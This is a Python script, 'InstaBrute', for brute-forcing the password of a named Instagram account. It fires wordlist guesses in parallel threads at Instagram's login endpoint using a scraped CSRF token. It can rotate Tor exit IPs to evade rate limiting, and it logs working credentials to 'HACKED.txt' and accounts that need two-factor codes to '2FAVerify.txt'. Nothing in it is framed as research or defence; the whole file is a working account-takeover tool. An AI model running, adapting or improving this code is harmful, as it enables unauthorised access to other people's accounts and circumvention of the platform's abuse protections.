import requests
import threading
import time
import os
import re
import sys
from stem import Signal
from stem.control import Controller
from datetime import datetime  # Add this line

class InstaBrute:
    def __init__(self):
        self.use_tor = False
        self.start()

    def start(self):
        try:
            user = self.get_valid_username()
            combo_path = input('WORDLIST PATH: ')
            print("""
  _____           _                                     __                   
 |_   _|         | |                                   / _|                  
   | |  _ __  ___| |_ __ _  __ _ _ __ __ _ _ __ ___   | |_ ___  _ __ ___ ___ 
   | | | '_ \/ __| __/ _` |/ _` | '__/ _` | '_ ` _ \  |  _/ _ \| '__/ __/ _ /
  _| |_| | | \__ \ || (_| | (_| | | | (_| | | | | | | | || (_) | | | (_|  __/
 |_____|_| |_|___/\__\__,_|\__, |_|  \__,_|_| |_| |_| |_| \___/|_|  \___\___|
                            __/ |                                            
                           |___/                                             
""")
        except KeyboardInterrupt:
            print('The tool was interrupted. Exiting...')
            sys.exit()
        except Exception as e:
            print(f"An error occurred: {str(e)}")
            sys.exit(1)

        tor_use = input('Do you want to use Tor? (y/n): ')
        if tor_use.lower() == 'y':
            self.use_tor = True
            self.start_tor()

        self.load_wordlist(combo_path, user)

    def get_valid_username(self):
        while True:
            user = input('INSTAGRAM USERNAME: ')
            if re.match("^[a-zA-Z0-9_]{1,30}$", user):
                print("Valid Instagram username.")
                return user
            else:
                print("Invalid Instagram username. Please enter a valid username.")

    def start_tor(self):
        os.system("tor &")
        time.sleep(5)

    def load_wordlist(self, combo_path, user):
        with open(combo_path, 'r') as file:
            password_list = file.read().splitlines()

        threads = []
        for password in password_list:
            thread = threading.Thread(target=self.new_brute, args=(user, password))
            thread.start()
            threads.append(thread)
            time.sleep(0.9)

        for t in threads:
            t.join()

    def new_brute(self, user, password):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time_stamp = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_stamp}:{password}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            if self.use_tor:
                s.proxies = {
                    'http': 'socks5://127.0.0.1:9050',
                    'https': 'socks5://127.0.0.1:9050'
                }

            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })

            print(f'{user}:{password}\nTRYING===============ATTACKING')

            if 'authenticated": true' in r.text:
                print("[+] Password [{}] is Correct :)".format(password))
                with open('HACKED.txt', 'a') as file:
                    file.write(user + ':' + password + '\n')
            elif 'two_factor_required' in r.text:
                print("[!] Warning: This account uses 2F Authentication: It's Locked!!!")
                with open('2FAVerify.txt', 'a') as file:
                    file.write(user + ':' + password + '\n')

            if self.use_tor:
                self.change_ip()
                time.sleep(5)

    def change_ip(self):
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)

if __name__ == "__main__":
    try:
        InstaBrute()
    except Exception as e:
        print(f"An error occurred during instantiation: {str(e)}")